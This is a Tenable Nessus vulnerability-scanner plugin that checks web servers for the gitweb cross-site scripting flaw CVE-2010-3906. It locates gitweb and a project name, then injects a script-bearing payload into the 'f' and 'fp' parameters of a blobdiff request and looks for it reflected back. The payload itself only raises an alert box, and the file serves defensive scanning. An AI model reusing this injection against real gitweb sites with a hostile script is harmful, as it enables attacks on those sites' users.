#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(51370);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/01/13 20:37:05 $");

  script_cve_id("CVE-2010-3906");
  script_bugtraq_id(45439);
  script_osvdb_id(69929);
  script_xref(name:"EDB-ID", value:"15744");

  script_name(english:"Git gitweb Multiple Parameter XSS");
  script_summary(english:"Tries to inject script code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a CGI script that is prone to a cross-
site scripting attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of gitweb, a web-enabled interface to the open source
distributed version control system Git, hosted on the remote web
server fails to sanitize user-supplied input to the 'f' and 'fp'
parameters before using it to generate dynamic HTML.

An attacker may be able to leverage this issue to inject arbitrary
HTML or script code into a user's browser to be executed within the
security context of the affected site."
  );
  script_set_attribute(attribute:"see_also", value:"http://lists.q42.co.uk/pipermail/git-announce/2011-August/000450.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Git 1.7.3.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/12/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:git:git");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded:FALSE);


payload = '"><body onload="alert(\'' + SCRIPT_NAME + '\')"><a';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/gitweb", "/cgi-bin/gitweb", "/git", "/code", cgi_dirs()));
else dirs = make_list(cgi_dirs());

err_msg = "";
gitweb_found = FALSE;
foreach dir (dirs)
{
  proj = "";

  foreach ext (make_list("cgi", "pl", "perl"))
  {
    # Check for gitweb.
    url = dir + "/gitweb." + ext;
    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

    if (
      '<!-- git web interface version' >< res[2] ||
      'meta name="generator" content="gitweb' >< res[2]
    )
    {
      gitweb_found = TRUE;

      # Identify an existing project.
      pat = 'gitweb\\.' + ext + '\\?p=([^;"]+);a=';
      matches = egrep(pattern:pat, string:res[2]);
      if (matches)
      {
        foreach match (split(matches, keep:FALSE))
        {
          item = eregmatch(pattern:pat, string:match);
          if (!isnull(item))
          {
            proj = item[1];
            break;
          }
        }
      }

      if (!proj)
      {
        res = http_send_recv3(port:port, method:"GET", item:url+'?a=project_index', exit_on_fail:TRUE);
        if ('inline; filename="index.aux"' >< res[1])
        {
          pat = '^([^ ]+)\\.git';
          matches = egrep(pattern:pat, string:res[2]);
          if (matches)
          {
            foreach match (split(matches, keep:FALSE))
            {
              item = eregmatch(pattern:pat, string:match);
              if (!isnull(item))
              {
                proj = item[1];
                break;
              }
            }
          }
        }
      }

      if (!proj)
      {
        err_msg += "Couldn't find a project to use to test the gitweb install at " + build_url(port:port, qs:url) + '.\n';
        continue;
      }

      # Try to exploit the issue.
      vuln = test_cgi_xss(
        port     : port,
        cgi      : "/gitweb." + ext,
        dirs     : make_list(dir),
        qs       : 'p=' + proj + '.git;' +
                   'a=blobdiff;' +
                   'f=' + urlencode(str:payload) + ';' +
                   'fp=' + urlencode(str:payload),
        pass_str : proj+'.git - history of ' + payload,
        pass2_re : 'git/blobdiff - '
      );
      if (vuln && !thorough_tests) exit(0);
    }

    # If we found a project, we don't need to test other extensions in this directory.
    if (proj) break;
  }
}

if (gitweb_found == FALSE) exit(0, "The web server on port "+port+" does not appear to host gitweb.");
else if (err_msg) exit(1, err_msg);
else exit(0, "The web server on port "+port+" does not appear to host any vulnerable installs of gitweb.");
